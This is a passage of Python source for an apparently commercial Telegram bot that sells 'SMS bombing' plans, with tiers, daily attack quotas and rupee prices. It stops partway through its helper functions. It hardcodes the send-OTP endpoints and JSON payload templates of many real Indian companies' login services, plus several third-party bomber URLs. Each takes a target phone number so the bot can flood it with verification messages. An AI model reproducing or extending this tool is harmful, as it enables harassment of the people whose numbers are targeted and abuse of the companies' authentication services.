import os
import sys
import asyncio
import aiohttp
import sqlite3
import random
import logging
import string
import gc
import time
import hashlib
import json as _json
from datetime import datetime, timezone, timedelta, timedelta as _td
from collections import defaultdict, deque
try:
    import psutil
    _PSUTIL = True
except ImportError:
    _PSUTIL = False

# ── Environment variables ──
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))

if not BOT_TOKEN:
    print("❌ ERROR: BOT_TOKEN environment variable not set!")
    sys.exit(1)
if ADMIN_ID == 0:
    print("⚠️ WARNING: ADMIN_ID not set. Admin features will be disabled.")

# ── IST Timezone (UTC+5:30) ──
IST = timezone(_td(hours=5, minutes=30))
def now_ist():
    return datetime.now(IST).replace(tzinfo=None)

from urllib.parse import quote
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
from telegram.ext import (
    ApplicationBuilder, CommandHandler, ContextTypes,
    CallbackQueryHandler, MessageHandler, filters
)
from telegram.constants import ParseMode

# ══════════════════════════════════════════════════════════════
#                    ⚙️ CONFIGURATION
# ══════════════════════════════════════════════════════════════
ADMIN_USERNAME  = "@PAPA_JI990"
BANNER_URL      = "https://ibb.co/8hb7w5v"
BOT_VERSION     = "v10000.0 ULTRA AI NEXUS 🔑"
BOT_NUMBER      = "+91 99999 99999"
PING_NUMBERS    = ["8777576645", "9236254320"]
FORCE_CHANNEL   = "@AGS_NEXUS_OFFICIAL"
RAM_MB          = 450
STOR_MB         = 512
DB_FILE         = "ags_v900.db"

# ══════════════════════════════════════════════════════════════
#              🔥 BLX INTERNAL POST API ENGINE
# ══════════════════════════════════════════════════════════════
BLX_FIRSTNAMES = ["Rahul","Priya","Amit","Sneha","Raj","Neha","Vikram","Pooja",
                   "Arjun","Kavya","Rohit","Divya","Suresh","Anita","Deepak",
                   "Meera","Kiran","Sunita","Anil","Rekha","Vijay","Geeta"]
BLX_LASTNAMES  = ["Sharma","Verma","Gupta","Singh","Kumar","Patel","Joshi",
                   "Mishra","Yadav","Tiwari","Chaudhary","Srivastava","Pandey",
                   "Dubey","Agarwal","Shah","Mehta","Reddy","Nair","Pillai"]

TIER_RANKS_MAP = {'free':0,'trial':1,'bronze':2,'silver':3,'gold':4,'premium':5,'elite':6,'banned':-1}

# ══════════════════════════════════════════════════════════════
#       🤖 AI INTELLIGENCE ENGINE — HARDEST LEVEL SYSTEMS
# ══════════════════════════════════════════════════════════════
ai_session_stats: dict = {}
ai_live_rps: dict      = {}
ai_api_scores: dict    = {}
ai_smart_queue: dict   = {}
global_hit_counter     = [0]

AI_THREAT_LEVELS = {
    'MINIMAL':   {'color':'🟢','desc':'Low activity','weight':1.0},
    'ELEVATED':  {'color':'🟡','desc':'Moderate activity','weight':1.2},
    'HIGH':      {'color':'🟠','desc':'High volume strike','weight':1.5},
    'CRITICAL':  {'color':'🔴','desc':'Maximum firepower','weight':2.0},
    'NEXUS':     {'color':'☢️', 'desc':'God-tier warfare','weight':3.0},
}

def get_threat_level(hits: int) -> str:
    if hits >= 50000: return 'NEXUS'
    if hits >= 10000: return 'CRITICAL'
    if hits >= 3000:  return 'HIGH'
    if hits >= 500:   return 'ELEVATED'
    return 'MINIMAL'

def ai_score_api(url: str, ok: bool, latency_ms: int):
    prev = ai_api_scores.get(url, 50.0)
    if ok:
        bonus = 15.0 if latency_ms < 300 else (8.0 if latency_ms < 800 else 3.0)
        ai_api_scores[url] = min(100.0, prev + bonus)
    else:
        ai_api_scores[url] = max(0.0, prev - 20.0)

def ai_init_session(uid: int):
    if uid not in ai_session_stats:
        ai_session_stats[uid] = {'strikes':0,'hits':0,'miss':0,'streak':0,'best_rps':0.0}
    if uid not in ai_live_rps:
        ai_live_rps[uid] = deque(maxlen=100)

def ai_update_session(uid: int, hit: int, miss: int, rps: float):
    ai_init_session(uid)
    s = ai_session_stats[uid]
    s['strikes'] += 1
    s['hits']    += hit
    s['miss']    += miss
    s['streak']  = s['streak'] + 1 if hit > miss else 0
    s['best_rps'] = max(s['best_rps'], rps)
    global_hit_counter[0] += hit

def ai_session_card(uid: int) -> str:
    ai_init_session(uid)
    s = ai_session_stats[uid]
    acc = int(s['hits'] / max(s['hits'] + s['miss'], 1) * 100)
    thr = get_threat_level(s['hits'])
    tl  = AI_THREAT_LEVELS[thr]
    return (
        f"🤖 <b>AI SESSION INTEL:</b>\n"
        f"  ⚔️  Strikes: <code>{s['strikes']}</code>  💥 Hits: <code>{fmt_num(s['hits'])}</code>\n"
        f"  🎯 Accuracy: <code>{acc}%</code>  🔥 Streak: <code>{s['streak']}</code>\n"
        f"  🚀 Best RPS: <code>{s['best_rps']:.2f}</code>\n"
        f"  {tl['color']} Threat: <code>{thr} — {tl['desc']}</code>"
    )

SESSION_START = datetime.now()
def session_uptime() -> str:
    delta = datetime.now() - SESSION_START
    h = delta.seconds // 3600; m = (delta.seconds % 3600) // 60; s = delta.seconds % 60
    return f"{h:02d}:{m:02d}:{s:02d}"

BLX_INTERNAL_APIS = [
    {"name":"MoneyView",    "url":"https://api.moneyview.in/lead-journey/send-otp",             "method":"json",      "payload":{"mobileNumber":"{mo}","source":"WEB"},                                                                                          "headers":{"Content-Type":"application/json"},                                      "min_tier":4},
    {"name":"GripInvest",   "url":"https://api.gripinvest.in/api/users/v1/send-signup-otp",     "method":"json",      "payload":{"phone":"{mo}","countryCode":"+91"},                                                                                             "headers":{"Content-Type":"application/json"},                                      "min_tier":4},
    {"name":"TataDigital",  "url":"https://www.tatadigital.com/api/user/send-otp",              "method":"json",      "payload":{"mobile":"{mo}","countryCode":"91","otpType":"LOGIN"},                                                                            "headers":{"Content-Type":"application/json"},                                      "min_tier":4},
    {"name":"MoreRetail",   "url":"https://www.moreretail.in/api/v1/customer/generateotp",      "method":"json",      "payload":{"mobileNo":"{mo}"},                                                                                                              "headers":{"Content-Type":"application/json"},                                      "min_tier":0},
    {"name":"Jio",          "url":"https://id.jio.com/authenticationapi/v1.0/send-otp",         "method":"json",      "payload":{"identifier":"{mo}","type":"MOBILE","application":"JIO_WEB"},                                                                    "headers":{"Content-Type":"application/json"},                                      "min_tier":0},
    {"name":"InfinityLearn","url":"https://infinitylearn.com/surge/api/website/v1/login/otp",   "method":"json",      "payload":{"mobileNo":"{mo}","countryCode":"+91"},                                                                                          "headers":{"Content-Type":"application/json"},                                      "min_tier":0},
    {"name":"BharatPe",     "url":"https://sapi.bharatpe.in/auth-service/api/v1/login/generate-otp","method":"json",  "payload":{"phone":"{mo}","medium":"BHARATPE_PARTNER"},                                                                                    "headers":{"Content-Type":"application/json"},                                      "min_tier":0},
    {"name":"AJIO",         "url":"https://www.ajio.com/api/user/login",                        "method":"json",      "payload":{"username":"{mo}","password":"","loginType":"GUEST"},                                                                            "headers":{"Content-Type":"application/json"},                                      "min_tier":4},
    {"name":"Chaayos",      "url":"https://www.chaayos.com/api/auth/otp",                       "method":"json",      "payload":{"phone":"{mo}","countryCode":"+91"},                                                                                             "headers":{"Content-Type":"application/json"},                                      "min_tier":0},
    {"name":"Unacademy",    "url":"https://api.unacademy.com/api/v1/auth/send-otp/",            "method":"json",      "payload":{"phone":"{mo}","country_code":"+91"},                                                                                            "headers":{"Content-Type":"application/json"},                                      "min_tier":0},
    {"name":"Rupee112",     "url":"https://www.rupee112.com/api/auth/sendOtp",                  "method":"json",      "payload":{"mobile":"{mo}","type":"register"},                                                                                              "headers":{"Content-Type":"application/json"},                                      "min_tier":0},
    {"name":"Picxele",      "url":"https://app.picxele.com/v2/signup/otp",                      "method":"json",      "payload":{"mobile":"{mo}","country_code":"+91"},                                                                                           "headers":{"Content-Type":"application/json"},                                      "min_tier":0},
    {"name":"Probo",        "url":"https://app.probo.in/api/v5/users/send-otp",                 "method":"json",      "payload":{"phone":"{mo}","dialing_code":"+91"},                                                                                            "headers":{"Content-Type":"application/json"},                                      "min_tier":0},
    {"name":"Apna",         "url":"https://apna.co/api/auth/otp/send",                          "method":"json",      "payload":{"mobile":"{mo}","country_code":"91"},                                                                                            "headers":{"Content-Type":"application/json"},                                      "min_tier":0},
]

logging.basicConfig(format='%(asctime)s [%(levelname)s] %(message)s', level=logging.INFO)

async def safe_send_photo(bot_or_msg, caption, reply_markup=None, parse_mode=None, chat_id=None, photo=None):
    _photo = photo or BANNER_URL
    try:
        if chat_id:
            return await bot_or_msg.send_photo(
                chat_id=chat_id, photo=_photo,
                caption=caption, reply_markup=reply_markup, parse_mode=parse_mode)
        else:
            return await bot_or_msg.reply_photo(
                photo=_photo, caption=caption,
                reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception:
        try:
            if chat_id:
                return await bot_or_msg.send_message(
                    chat_id=chat_id, text=caption,
                    reply_markup=reply_markup, parse_mode=parse_mode)
            else:
                return await bot_or_msg.reply_text(
                    caption, reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception as e:
            logging.error(f"safe_send_photo fallback failed: {e}")

# ══════════════════════════════════════════════════════════════
#           🎨 ULTRA AI CINEMATIC DESIGN SYSTEM v9000
# ══════════════════════════════════════════════════════════════
L1   = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
L2   = "═══════════════════════════════════"
L3   = "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"
L4   = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
L5   = "·  ·  ·  ·  ·  ·  ·  ·  ·  ·  ·  ·"
AR   = "➤"
BL   = "▸"
DT   = "◆"
SP   = "⚡"
CK   = "✦"
NEX  = "⬡"

AI_BOOT = [
    "⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛  0%",
    "🟥⬛⬛⬛⬛⬛⬛⬛⬛⬛  10%",
    "🟥🟧⬛⬛⬛⬛⬛⬛⬛⬛  20%",
    "🟥🟧🟨⬛⬛⬛⬛⬛⬛⬛  30%",
    "🟥🟧🟨🟩⬛⬛⬛⬛⬛⬛  40%",
    "🟥🟧🟨🟩🟦⬛⬛⬛⬛⬛  50%",
    "🟥🟧🟨🟩🟦🟦⬛⬛⬛⬛  60%",
    "🟥🟧🟨🟩🟦🟦🟪⬛⬛⬛  70%",
    "🟥🟧🟨🟩🟦🟦🟪🟫⬛⬛  80%",
    "🟥🟧🟨🟩🟦🟦🟪🟫⬜⬛  90%",
    "🟥🟧🟨🟩🟦🟦🟪🟫⬜✅  100%",
]

FIRE  = ["💥","⚡","🔥","☄️","💣","🌪️","🚀","⚔️","🎯","💫","🔱","🌊","☢️","🗡️","🔮","⚗️","🌀","💢","🧨","⚡","🔥"]
MEDALS = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"]
AI_ICONS = ["🤖","🧠","⚡","🔬","💡","🛸","🔭","⚗️","🧬","💻"]

BOMB_FRAMES = [
    "🔌 <b>NEURAL CORE</b> — Initializing...",
    "🧠 <b>AI ENGINE</b> — Loading matrices...",
    "⚡ <b>HYPERTHREAD</b> — Spinning up...",
    "🔥 <b>STRIKE MODULE</b> — Armed & ready...",
    "☢️  <b>NEXUS GRID</b> — All nodes online...",
    "🎯 <b>TARGET LOCK</b> — Coordinates set...",
    "🚀 <b>LAUNCH SEQUENCE</b> — Initiating...",
    "💥 <b>IMPACT PROTOCOL</b> — FIRE!",
]

TIER_BANNERS = {
    'free':    "🆓 ━━━ FREE ZONE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    'trial':   "⚡ ━━━ TRIAL VIP ━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    'bronze':  "🥉 ━━━ BRONZE TIER ━━━━━━━━━━━━━━━━━━━━━━━━━━",
    'silver':  "🥈 ━━━ SILVER TIER ━━━━━━━━━━━━━━━━━━━━━━━━━━",
    'gold':    "🥇 ━━━ GOLD TIER ━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    'premium': "💎 ━━━ PREMIUM VIP ━━━━━━━━━━━━━━━━━━━━━━━━━━",
    'elite':   "👑 ━━━ ELITE NEXUS ━━━━━━━━━━━━━━━━━━━━━━━━━━",
    'banned':  "🚫 ━━━ SUSPENDED ━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
}

TIER_GLOWS = {
    'free':    "○ ○ ○ ○ ○",
    'trial':   "◉ ○ ○ ○ ○",
    'bronze':  "◉ ◉ ○ ○ ○",
    'silver':  "◉ ◉ ◉ ○ ○",
    'gold':    "◉ ◉ ◉ ◉ ○",
    'premium': "◉ ◉ ◉ ◉ ◉",
    'elite':   "★ ★ ★ ★ ★",
    'banned':  "✕ ✕ ✕ ✕ ✕",
}

LOAD_FRAMES = AI_BOOT
SPIN_FRAMES = ["🔄","🔃","↩️","↪️","🔄"]

# ══════════════════════════════════════════════════════════════
#                    💎 TIER SYSTEM (8 Tiers)
# ══════════════════════════════════════════════════════════════
TIER_DATA = {
    'free':    {'badge':'🆓 FREE',         'color':'⚪','rank':0,'atk_per_day':3,    'rounds':30,    'speed':2.0,  'max_wl':1,  'custom_cd':0,    'info_hub':False, 'blx_access':False, 'schedule':False, 'custom_sms':False},
    'trial':   {'badge':'⚡ TRIAL VIP',    'color':'🟡','rank':1,'atk_per_day':8,    'rounds':100,   'speed':0.8,  'max_wl':1,  'custom_cd':7200, 'info_hub':False, 'blx_access':True,  'schedule':False, 'custom_sms':False},
    'bronze':  {'badge':'🥉 BRONZE VIP',   'color':'🟤','rank':2,'atk_per_day':15,   'rounds':300,   'speed':0.5,  'max_wl':2,  'custom_cd':3600, 'info_hub':False, 'blx_access':True,  'schedule':False, 'custom_sms':False},
    'silver':  {'badge':'🥈 SILVER VIP',   'color':'🔵','rank':3,'atk_per_day':30,   'rounds':700,   'speed':0.3,  'max_wl':3,  'custom_cd':1800, 'info_hub':False, 'blx_access':True,  'schedule':False, 'custom_sms':False},
    'gold':    {'badge':'🥇 GOLD VIP',     'color':'🟠','rank':4,'atk_per_day':60,   'rounds':2000,  'speed':0.1,  'max_wl':5,  'custom_cd':900,  'info_hub':False, 'blx_access':True,  'schedule':False, 'custom_sms':False},
    'premium': {'badge':'💎 PREMIUM VIP',  'color':'🟣','rank':5,'atk_per_day':150,  'rounds':8000,  'speed':0.05, 'max_wl':8,  'custom_cd':300,  'info_hub':False, 'blx_access':True,  'schedule':False, 'custom_sms':False},
    'elite':   {'badge':'👑 ELITE NEXUS',  'color':'🔴','rank':6,'atk_per_day':9999, 'rounds':999999,'speed':0.01, 'max_wl':15, 'custom_cd':0,    'info_hub':False, 'blx_access':True,  'schedule':False, 'custom_sms':False},
    'banned':  {'badge':'🚫 SUSPENDED',    'color':'⛔','rank':-1,'atk_per_day':0,   'rounds':0,     'speed':99,   'max_wl':0,  'custom_cd':0,    'info_hub':False, 'blx_access':False, 'schedule':False, 'custom_sms':False},
}

PLANS = {
    # ══ MICRO / FLASH RANGE (₹20-₹49) ══
    'micro_1h':    {'label':'⚡ FLASH 1 Hour',    'price':20,   'days':0,   'hours':1,   'desc':'Quick Flash ⚡',       'tier':'trial',   'category':'micro'},
    'micro_3h':    {'label':'⚡ FLASH 3 Hours',   'price':29,   'days':0,   'hours':3,   'desc':'Mini Session',         'tier':'trial',   'category':'micro'},
    'micro_6h':    {'label':'⚡ FLASH 6 Hours',   'price':39,   'days':0,   'hours':6,   'desc':'Half Day 🔥HOT',       'tier':'trial',   'category':'micro'},
    'micro_12h':   {'label':'⚡ FLASH 12 Hours',  'price':49,   'days':0,   'hours':12,  'desc':'Half Night Pack',      'tier':'trial',   'category':'micro'},
    # ══ LOW RANGE (₹9 - ₹49) ══
    'bronze_1h':   {'label':'🥉 BRONZE 1 Hour',   'price':9,    'days':0,   'hours':1,   'desc':'Quick Trial 🔥',      'tier':'bronze',  'category':'low'},
    'bronze_6h':   {'label':'🥉 BRONZE 6 Hours',  'price':15,   'days':0,   'hours':6,   'desc':'Half Day Pack',        'tier':'bronze',  'category':'low'},
    'bronze_1d':   {'label':'🥉 BRONZE 1 Day',    'price':20,   'days':1,   'hours':0,   'desc':'Entry Level',          'tier':'bronze',  'category':'low'},
    'bronze_2d':   {'label':'🥉 BRONZE 2 Days',   'price':35,   'days':2,   'hours':0,   'desc':'Weekend Pack',         'tier':'bronze',  'category':'low'},
    'bronze_3d':   {'label':'🥉 BRONZE 3 Days',   'price':49,   'days':3,   'hours':0,   'desc':'3-Day Starter',        'tier':'bronze',  'category':'low'},
    'trial_1d':    {'label':'⚡ TRIAL 1 Day',     'price':10,   'days':1,   'hours':0,   'desc':'Test Drive',           'tier':'trial',   'category':'low'},
    'trial_3d':    {'label':'⚡ TRIAL 3 Days',    'price':25,   'days':3,   'hours':0,   'desc':'Extended Trial',       'tier':'trial',   'category':'low'},
    # ══ MID RANGE (₹50 - ₹299) ══
    'silver_1d':   {'label':'🥈 SILVER 1 Day',    'price':50,   'days':1,   'hours':0,   'desc':'Power Day',            'tier':'silver',  'category':'mid'},
    'silver_3d':   {'label':'🥈 SILVER 3 Days',   'price':99,   'days':3,   'hours':0,   'desc':'Most Popular ⭐',      'tier':'silver',  'category':'mid'},
    'silver_7d':   {'label':'🥈 SILVER 7 Days',   'price':149,  'days':7,   'hours':0,   'desc':'Weekly Silver',        'tier':'silver',  'category':'mid'},
    'silver_15d':  {'label':'🥈 SILVER 15 Days',  'price':199,  'days':15,  'hours':0,   'desc':'Biweekly Pack',        'tier':'silver',  'category':'mid'},
    'silver_30d':  {'label':'🥈 SILVER 30 Days',  'price':249,  'days':30,  'hours':0,   'desc':'Monthly Silver',       'tier':'silver',  'category':'mid'},
    'gold_1d':     {'label':'🥇 GOLD 1 Day',      'price':79,   'days':1,   'hours':0,   'desc':'Gold Rush Day',        'tier':'gold',    'category':'mid'},
    'gold_3d':     {'label':'🥇 GOLD 3 Days',     'price':120,  'days':3,   'hours':0,   'desc':'Best Value 🔥',        'tier':'gold',    'category':'mid'},
    'gold_7d':     {'label':'🥇 GOLD 7 Days',     'price':199,  'days':7,   'hours':0,   'desc':'Golden Week',          'tier':'gold',    'category':'mid'},
    'gold_15d':    {'label':'🥇 GOLD 15 Days',    'price':279,  'days':15,  'hours':0,   'desc':'Fortnight Gold',       'tier':'gold',    'category':'mid'},
    'gold_30d':    {'label':'🥇 GOLD 30 Days',    'price':299,  'days':30,  'hours':0,   'desc':'Monthly Gold',         'tier':'gold',    'category':'mid'},
    # ══ HIGH RANGE (₹350 - ₹9999) ══
    'premium_1d':  {'label':'💎 PREMIUM 1 Day',   'price':99,   'days':1,   'hours':0,   'desc':'Premium Flash',        'tier':'premium', 'category':'high'},
    'premium_3d':  {'label':'💎 PREMIUM 3 Days',  'price':199,  'days':3,   'hours':0,   'desc':'Power Trio',           'tier':'premium', 'category':'high'},
    'premium_7d':  {'label':'💎 PREMIUM 7 Days',  'price':350,  'days':7,   'hours':0,   'desc':'Power Week 💣',        'tier':'premium', 'category':'high'},
    'premium_15d': {'label':'💎 PREMIUM 15 Days', 'price':550,  'days':15,  'hours':0,   'desc':'Pro Fortnight',        'tier':'premium', 'category':'high'},
    'premium_30d': {'label':'💎 PREMIUM 30 Days', 'price':999,  'days':30,  'hours':0,   'desc':'Power User 💎',        'tier':'premium', 'category':'high'},
    'premium_90d': {'label':'💎 PREMIUM 90 Days', 'price':2499, 'days':90,  'hours':0,   'desc':'Quarterly Power',      'tier':'premium', 'category':'high'},
    'elite_7d':    {'label':'👑 ELITE 7 Days',    'price':699,  'days':7,   'hours':0,   'desc':'Elite Week',           'tier':'elite',   'category':'high'},
    'elite_15d':   {'label':'👑 ELITE 15 Days',   'price':1199, 'days':15,  'hours':0,   'desc':'Elite Fortnight',      'tier':'elite',   'category':'high'},
    'elite_30d':   {'label':'👑 ELITE 30 Days',   'price':1999, 'days':30,  'hours':0,   'desc':'Elite Month 👑',       'tier':'elite',   'category':'high'},
    'elite_90d':   {'label':'👑 ELITE 90 Days',   'price':4999, 'days':90,  'hours':0,   'desc':'Elite Quarter',        'tier':'elite',   'category':'high'},
    'elite_life':  {'label':'👑 ELITE LIFETIME',  'price':9999, 'days':36500,'hours':0,  'desc':'Lifetime Boss 👑',     'tier':'elite',   'category':'high'},
}

# ══════════════════════════════════════════════════════════════
#                    🗄️ DATABASE
# ══════════════════════════════════════════════════════════════
db = sqlite3.connect(DB_FILE, check_same_thread=False, timeout=10)
cursor = db.cursor()

cursor.executescript('''
CREATE TABLE IF NOT EXISTS access_keys (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    key_code      TEXT    UNIQUE NOT NULL,
    tier          TEXT    DEFAULT 'bronze',
    duration_mins INTEGER DEFAULT 60,
    max_attacks   INTEGER DEFAULT -1,
    daily_attacks INTEGER DEFAULT -1,
    max_concurrent INTEGER DEFAULT 1,
    max_uses      INTEGER DEFAULT 1,
    used_count    INTEGER DEFAULT 0,
    created_by    INTEGER DEFAULT 0,
    created_at    TEXT,
    note          TEXT    DEFAULT ''
);
CREATE TABLE IF NOT EXISTS user_key_sessions (
    user_id               INTEGER PRIMARY KEY,
    key_code              TEXT    DEFAULT '',
    tier                  TEXT    DEFAULT 'free',
    activated_at          TEXT,
    expires_at            TEXT,
    max_attacks           INTEGER DEFAULT -1,
    daily_attacks_limit   INTEGER DEFAULT -1,
    max_concurrent        INTEGER DEFAULT 1,
    total_attacks_used    INTEGER DEFAULT 0,
    daily_attacks_used    INTEGER DEFAULT 0,
    last_atk_date         TEXT    DEFAULT ''
);
CREATE TABLE IF NOT EXISTS users (
    id              INTEGER PRIMARY KEY,
    username        TEXT    DEFAULT 'Unknown',
    first_name      TEXT    DEFAULT '',
    tier            TEXT    DEFAULT 'free',
    expiry          TEXT    DEFAULT '0',
    referrals       INTEGER DEFAULT 0,
    ref_by          INTEGER DEFAULT 0,
    total_sent      INTEGER DEFAULT 0,
    total_attacks   INTEGER DEFAULT 0,
    daily_attacks   INTEGER DEFAULT 0,
    last_atk_date   TEXT    DEFAULT '',
    banned          INTEGER DEFAULT 0,
    ban_reason      TEXT    DEFAULT '',
    joined_at       TEXT,
    last_seen       TEXT
);
CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
CREATE TABLE IF NOT EXISTS apis (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    url         TEXT UNIQUE,
    name        TEXT    DEFAULT 'API',
    hits        INTEGER DEFAULT 0,
    active      INTEGER DEFAULT 1,
    error_msg   TEXT    DEFAULT '',
    added_at    TEXT
);
CREATE TABLE IF NOT EXISTS whitelist (
    entry       TEXT PRIMARY KEY,
    type        TEXT    DEFAULT 'number',
    added_by    INTEGER,
    label       TEXT    DEFAULT '',
    added_at    TEXT
);
CREATE TABLE IF NOT EXISTS payments (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id     INTEGER,
    plan        TEXT,
    amount      INTEGER,
    utr         TEXT    DEFAULT '',
    screenshot  TEXT    DEFAULT '',
    status      TEXT    DEFAULT 'pending',
    created_at  TEXT,
    verified_at TEXT    DEFAULT '',
    verified_by INTEGER DEFAULT 0
);
CREATE TABLE IF NOT EXISTS custom_limits (
    user_id          INTEGER PRIMARY KEY,
    atk_per_day      INTEGER DEFAULT 0,
    rounds           INTEGER DEFAULT 0,
    cooldown_secs    INTEGER DEFAULT -1,
    max_sim_attacks  INTEGER DEFAULT -1,
    set_by           INTEGER,
    set_at           TEXT
);
CREATE TABLE IF NOT EXISTS tier_limits (
    tier             TEXT PRIMARY KEY,
    atk_per_day      INTEGER DEFAULT -1,
    rounds           INTEGER DEFAULT -1,
    speed            REAL    DEFAULT -1,
    cooldown_secs    INTEGER DEFAULT -1,
    max_sim          INTEGER DEFAULT -1,
    updated_at       TEXT
);
CREATE TABLE IF NOT EXISTS db_plans (
    plan_key    TEXT PRIMARY KEY,
    label       TEXT    DEFAULT '',
    price       INTEGER DEFAULT 0,
    days        INTEGER DEFAULT 0,
    hours       INTEGER DEFAULT 0,
    tier        TEXT    DEFAULT 'bronze',
    desc_text   TEXT    DEFAULT '',
    active      INTEGER DEFAULT 1,
    category    TEXT    DEFAULT 'mid',
    added_at    TEXT
);
CREATE TABLE IF NOT EXISTS blx_apis (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    name        TEXT    DEFAULT 'BLX API',
    url         TEXT    UNIQUE,
    method      TEXT    DEFAULT 'json',
    payload     TEXT    DEFAULT '{}',
    headers     TEXT    DEFAULT '{}',
    min_tier    INTEGER DEFAULT 0,
    active      INTEGER DEFAULT 1,
    hits        INTEGER DEFAULT 0,
    fail_count  INTEGER DEFAULT 0,
    added_at    TEXT
);
''')

_DEF = {
    'maintenance':    'off',
    'upi_id':         'your_upi@oksbi',
    'upi_name':       'AGS NEXUS',
    'trial_minutes':  '2',
    'force_join':     'on',
}
for k, v in _DEF.items():
    cursor.execute("INSERT OR IGNORE INTO settings VALUES (?,?)", (k,v))

_APIS = [
    ("https://mr-ags.fun/Bomb/?mo=(number)&acode=793185&submit=Bomb+Now",           "MR-AGS"),
    ("https://crypto-script.rf.gd/Bom/hardbomber.php?mobile=(number)&submit=Bomb", "CryptoScript"),
    ("https://404-rounak.unaux.com/SMS/api.php?mobile=(number)&msg=Test&i=1",       "404-Rounak"),
    ("https://speedx.ct.ws/Bombber/?i=2&mobile=(number)",                            "SpeedX"),
]
for url, name in _APIS:
    cursor.execute("INSERT OR IGNORE INTO apis (url,name,added_at) VALUES (?,?,?)",
                   (url, name, now_ist().strftime('%Y-%m-%d %H:%M:%S')))

import json as _json
for _blx in BLX_INTERNAL_APIS:
    cursor.execute("""INSERT OR IGNORE INTO blx_apis
        (name,url,method,payload,headers,min_tier,active,added_at) VALUES (?,?,?,?,?,?,1,?)""",
        (_blx['name'], _blx['url'], _blx['method'],
         _json.dumps(_blx['payload']), _json.dumps(_blx['headers']),
         _blx['min_tier'], now_ist().strftime('%Y-%m-%d %H:%M:%S')))

db.commit()

_migrations = [
    "ALTER TABLE custom_limits ADD COLUMN cooldown_secs INTEGER DEFAULT -1",
    "ALTER TABLE custom_limits ADD COLUMN max_sim_attacks INTEGER DEFAULT -1",
]
for _m in _migrations:
    try: cursor.execute(_m); db.commit()
    except: pass

_setting_defaults = [
    ('ping_numbers', '8777576645,9236254320'),
    ('api_error_retry', '1'),
]
for _k, _v in _setting_defaults:
    cursor.execute("INSERT OR IGNORE INTO settings (key,value) VALUES (?,?)", (_k, _v))
db.commit()

def get_ping_numbers() -> list:
    raw = gs('ping_numbers', '8777576645,9236254320')
    return [n.strip() for n in raw.split(',') if n.strip().isdigit() and len(n.strip()) == 10]

active_tasks = {}
custom_cd_map = {}
_res_warned = False

# ══════════════════════════════════════════════════════════════
#                    🔧 CORE HELPERS
# ══════════════════════════════════════════════════════════════
def gs(k, d=''):
    cursor.execute("SELECT value FROM settings WHERE key=?", (k,))
    r = cursor.fetchone(); return r[0] if r else d

def ss(k, v):
    cursor.execute("UPDATE settings SET value=? WHERE key=?", (v,k)); db.commit()

def is_maint(): return gs('maintenance') == 'on'
def tb(t): return TIER_DATA.get(t,{}).get('badge', t.upper())
def tc(t): return TIER_DATA.get(t,{}).get('color','⚪')
def tr(t): return TIER_DATA.get(t,{}).get('rank',0)
def is_vip(t): return tr(t) >= 2

def fmt_num(n): return f"{int(n):,}"
def fmt_time(s):
    s=int(s); h,r=divmod(s,3600); m,sec=divmod(r,60)
    return f"{h:02d}:{m:02d}:{sec:02d}" if h else f"{m:02d}:{sec:02d}"
def rand_code(n=8): return ''.join(random.choices(string.ascii_uppercase+string.digits, k=n))
def get_bar(c, t, l=16):
    if t<=0: return "▱"*l
    f=int(l*c/t); return "▰"*f+"▱"*(l-f)
def is_protected(e):
    cursor.execute("SELECT entry FROM whitelist WHERE entry=?", (e,)); return cursor.fetchone() is not None

def get_tier_override(tier: str, field: str, default):
    try:
        cursor.execute(f"SELECT {field} FROM tier_limits WHERE tier=?", (tier,))
        row = cursor.fetchone()
        if row and row[0] is not None and row[0] >= 0:
            return row[0]
    except: pass
    return default

def get_atk_per_day(uid, tier):
    if uid == ADMIN_ID: return 999999
    cursor.execute("SELECT atk_per_day FROM custom_limits WHERE user_id=?", (uid,))
    row = cursor.fetchone()
    if row and row[0] > 0: return row[0]
    default = TIER_DATA.get(tier, {}).get('atk_per_day', 3)
    val = get_tier_override(tier, 'atk_per_day', default)
    return 999999 if val == 0 else val

def get_rounds(uid, tier):
    if uid == ADMIN_ID: return 9999999
    cursor.execute("SELECT rounds FROM custom_limits WHERE user_id=?", (uid,))
    row = cursor.fetchone()
    if row and row[0] > 0: return row[0]
    default = TIER_DATA.get(tier, {}).get('rounds', 30)
    val = get_tier_override(tier, 'rounds', default)
    return 9999999 if val == 0 else val

def get_speed(tier, uid):
    if uid == ADMIN_ID: return 0.000001
    default = TIER_DATA.get(tier, {}).get('speed', 2.0)
    val = get_tier_override(tier, 'speed', default)
    return val if val >= 0 else default

def get_cooldown(tier, uid):
    if uid == ADMIN_ID: return 0
    cursor.execute("SELECT cooldown_secs FROM custom_limits WHERE user_id=?", (uid,))
    row = cursor.fetchone()
    if row and row[0] >= 0: return row[0]
    default = TIER_DATA.get(tier, {}).get('custom_cd', 0)
    return get_tier_override(tier, 'cooldown_secs', default)

def daily_left(uid, tier):
    if uid == ADMIN_ID: return 999999
    limit = get_atk_per_day(uid, tier)
    if limit >= 999999: return 999999
    today = now_ist().strftime('%Y-%m-%d')
    cursor.execute("SELECT daily_attacks, last_atk_date FROM users WHERE id=?", (uid,))
    row = cursor.fetchone()
    if not row: return limit
    cnt, last_d = row
    if last_d != today:
        cursor.execute("UPDATE users SET daily_attacks=0, last_atk_date=? WHERE id=?", (today, uid))
        db.commit(); return limit
